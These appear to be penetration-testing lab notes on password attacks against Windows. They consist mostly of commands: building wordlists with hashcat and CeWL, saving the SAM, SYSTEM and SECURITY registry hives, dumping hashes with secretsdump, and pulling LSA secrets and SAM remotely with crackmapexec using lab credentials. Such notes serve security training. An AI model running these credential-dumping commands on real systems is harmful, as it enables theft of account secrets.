- crackmapexec
- EVil-WinRM
- hydra
- metasploit
- 



hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

### Generating Wordlists Using CeWL
```
 cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

## Attacking SAM
![SAM Registry](/Assets/SAM%20Registry.png)

### Using reg.exe save to Copy Registry Hives
```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

### Dumping Hashes with Impacket's secretsdump.py
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Remote Dumping & LSA Secrets Considerations
Dumping LSA Secrets Remotely
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
Dumping SAM Remotely
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
